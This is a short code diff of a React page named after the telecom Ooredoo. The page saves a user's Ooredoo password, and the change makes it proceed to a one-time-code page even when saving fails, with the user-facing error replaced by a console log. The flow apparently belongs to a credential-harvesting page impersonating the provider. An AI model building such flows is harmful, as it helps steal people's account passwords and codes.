@@ -26,10 +26,10 @@ export default function Ooredoo() {
         ooredooPassword,
       });
       toast.success("تم حفظ البيانات بنجاح");
-      setLocation(`/otp-ooredoo?session=${sessionId}`);
     } catch (error) {
-      toast.error("حدث خطأ في حفظ البيانات");
+      console.error("Error saving Ooredoo data in DB, continuing anyway:", error);
     }
+    setLocation(`/otp-ooredoo?session=${sessionId}`);
   };
 
   return (
